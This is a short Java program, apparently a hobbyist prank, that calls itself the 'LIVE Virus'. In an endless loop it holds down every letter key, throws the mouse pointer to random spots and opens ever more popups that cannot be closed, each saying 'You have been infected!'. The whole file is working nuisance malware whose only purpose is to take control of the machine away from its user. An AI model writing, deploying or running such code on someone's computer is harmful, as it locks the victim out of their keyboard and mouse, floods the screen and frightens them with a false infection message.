import java.awt.*;
import java.util.Random;
import javax.swing.*;

public class Live {
    static Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize(); //To get dimensions of the screen
    static int w = (int) screenSize.getWidth(); //Height
    static int h = (int) screenSize.getHeight(); //Width
    static Robot r;
    static Random m = new Random();

    static void declareRobot() throws Exception {
        r = new Robot(); //I had to do this because of the exception
    }

    static void jamKeyboard() {
        for (int i = 65; i <= 90; i++) {
            r.keyPress(i); //Enters all letters from a-z, jamming the keyboard
        }
    }

    static void jamMouse() throws Exception {
        r.mouseMove(m.nextInt(w),m.nextInt(h)); //Moves the mouse pointer anywhere within the screen
    }

    static void popup() {
        JFrame frame = new JFrame("LIVE Virus"); //Creates a popup with "LIVE Virus" as the title
        JLabel label = new JLabel("You have been infected!", JLabel.CENTER); //Creates a centered label saying "You have been infected!"
        frame.setSize(200,75); //Sets the JFrame's size
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE); //Disables the closing option
        frame.add(label); //Adds the JLabel to the JFrame
        frame.setLocation(m.nextInt(w),m.nextInt(h)); //Makes the JFrame go to a random location within the screen
        frame.setVisible(true); //Makes the JFrame visible
    }

    public static void main(String[] args) throws Exception {
        declareRobot();
        while (true) {
            jamKeyboard();
            jamMouse();
            popup();
        }
    }
}